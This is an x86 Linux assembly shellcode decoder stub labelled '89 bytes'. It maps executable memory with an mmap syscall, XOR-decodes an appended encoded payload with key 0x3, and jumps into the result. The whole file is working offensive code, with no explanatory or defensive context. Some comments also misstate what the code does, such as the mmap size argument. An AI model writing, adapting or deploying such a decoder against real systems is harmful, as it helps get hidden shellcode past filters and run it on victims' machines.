# 89 bytes
.section .data

.section .text

.global _start

_start:
jmp start

inject:
	pop %ecx         #pop the return address
	pop %ebx         #pop the encoded shellcode start address
	pop %eax	 #pop the mmaped memory address

	xor %edx, %edx
	push %edx
	pop %ecx	 #zero out edx and ecx (which holds the return address)

inject_loop:
	cmpb $0x20, (%ebx, %edx, 1)
	je inject_finished
	movb (%ebx, %edx, 1), %cl
	xor $0x3, %cl
	movb %cl, (%eax, %edx, 1)
	inc %edx
	jmp inject_loop

inject_finished:
	inc %edx
	movb $0xc3, (%eax, %edx, 1)
	push %ecx
	push %eax
	ret
	

getpc:
	mov (%esp), %eax
	ret

start:
	call getpc        #find ourself on stack
	mov %eax, %edx
	add $0x2a, %edx   #add decoder length to find shell beginging
		
        push $90
        pop %eax           #mmap() syscall

        xor %ebx, %ebx
	push %ebx
	push %ebx	   #arg 5/6

	push $0x22	   #arg 4
	push $0x7	   #arg 3
	
        push %ebx
        pop %ecx
        inc %ecx
        shl $0x12, %ecx
        push %ecx          #arg2 0x1000

	push %ebx          #arg 1

        mov %esp, %ebx
        int $0x80

	push %eax	  #push mmap pointer	
	push %edx         #push our shellcode begining
	
	call inject

exit:
	xor %eax, %eax
	mov %eax, %ebx
	inc %eax
	int $0x80

